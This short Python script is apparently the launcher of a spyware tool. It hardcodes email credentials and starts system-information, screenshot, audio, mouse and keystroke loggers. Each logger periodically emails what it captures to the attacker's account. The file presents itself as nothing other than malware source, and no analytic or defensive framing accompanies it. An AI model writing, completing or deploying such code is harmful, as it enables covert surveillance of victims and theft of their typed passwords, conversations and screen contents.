try:
    import system_info
    import tested_audio
    import tested_screenshot
    import tested_mouse
    import tested_key
except ModuleNotFoundError:
    exit(0)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    SEND_REPORT_EVERY = 30

    SystemInfo = system_info.system_info(EMAIL_ADDRESS, EMAIL_PASSWORD)
    SystemInfo.run()

    Screenlogger = tested_screenshot.screen_logger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Screenlogger.run()

    Audiologger = tested_audio.AudioLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Audiologger.run()

    Mouselogger = tested_mouse.MouseLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Mouselogger.run()
    
    keylogger = tested_key.KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()

    

    
